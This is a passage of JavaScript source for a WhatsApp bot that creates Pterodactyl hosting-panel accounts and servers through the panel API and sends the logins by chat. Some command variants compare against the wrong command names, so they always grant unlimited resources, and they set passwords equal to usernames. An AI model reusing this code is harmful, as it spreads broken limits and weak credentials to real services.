➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
➤ Dibuat Pada : ${tanggal(Date.now())}
➤ Username Panel: ${text}
© Copyright DanzBotz V2 — Update 2025`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	let buttons = [
  {
    buttonId: ".ping", 
    buttonText: { 
      displayText: "Ping"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbr4"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbr4"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbr4"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbr4"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbr4"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbr4"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbr4"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbr4"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbr4"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbr4"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbr4"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbr4"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbr4"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbr4"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbr4"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunlir4"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "cp1gbr4": case "cp2gbr4": case "cp3gbr4": case "cp4gbr4": case "cp5gbr4": case "cp6gbr4": case "cp7gbr4": case "cp8gbr4": case "cp9gbr4": case "cp10gbr4": case "cp11gbr4": case "cp12gbr4": case "cp13gbr4": case "cp14gbr4": case "cp15gbr4": case "cpunlir4": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV4 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV4 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV4}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cprandom5': case 'cpbuttonrandom5':{
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = ` 
╭───────────✦───────────╮
     *乂 List Ram Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
➤ Dibuat Pada : ${tanggal(Date.now())}
➤ Username Panel: ${text}
© Copyright DanzBotz V2 — Update 2025`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	let buttons = [
  {
    buttonId: ".ping", 
    buttonText: { 
      displayText: "Ping"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbr5"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbr5"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbr5"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbr5"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbr5"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbr5"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbr5"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbr5"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbr5"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbr5"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbr5"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbr5"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbr5"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbr5"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbr5"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunlir5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "cp1gbr5": case "cp2gbr5": case "cp3gbr5": case "cp4gbr5": case "cp5gbr5": case "cp6gbr5": case "cp7gbr5": case "cp8gbr5": case "cp9gbr5": case "cp10gbr5": case "cp11gbr5": case "cp12gbr5": case "cp13gbr5": case "cp14gbr5": case "cp15gbr5": case "cpunlir5": { 
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV5 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV5 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV5}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cpanelbutton': {
if (!isPremium && !isCreator) return Reply(mess.prem)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gb"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gb"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gb"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gb"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gb"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gb"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gb"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gb"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gb"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gb"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gb"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gb"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gb"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gb"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gb"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunli"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cpunli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cpunli") {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

//Batas

case 'cpanelbuttonv2': {
if (!isPremium && !isCreator) return Reply(mess.prem)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbv2"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbv2"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbv2"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbv2"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbv2"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbv2"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbv2"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbv2"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbv2"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbv2"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbv2"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbv2"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbv2"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbv2"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbv2"
                                  },
                                                                {
